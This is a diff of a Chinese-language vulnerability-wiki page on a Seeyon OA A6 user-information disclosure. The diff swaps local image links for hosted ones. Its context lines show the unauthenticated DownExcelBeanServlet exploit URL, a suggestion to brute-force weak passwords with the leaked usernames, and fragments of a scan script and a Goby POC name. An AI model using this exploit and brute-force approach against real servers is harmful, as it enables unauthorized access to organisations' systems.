@@ -24,7 +24,7 @@
 http://xxx.xxx.xxx.xxx/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0
 ```
 
-![](image/zhiyuan-18.png)
+![](http://wikioss.peiqi.tech/vuln/zhiyuan-18.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 可以再利用得到的用户名使用弱口令爆破进入OA进一步攻击
 
@@ -81,7 +81,7 @@ if __name__ == '__main__':
     Scan(file_name)
 ```
 
-![](image/zhiyuan-19.png)
+![](http://wikioss.peiqi.tech/vuln/zhiyuan-19.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 ## Goby & POC
 
@@ -91,4 +91,4 @@ if __name__ == '__main__':
 >
 > Seeyon_OA_A6_DownExcelBeanServlet_User_information_leakage
 
-![](image/zhiyuan-20.png)
+![](http://wikioss.peiqi.tech/vuln/zhiyuan-20.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
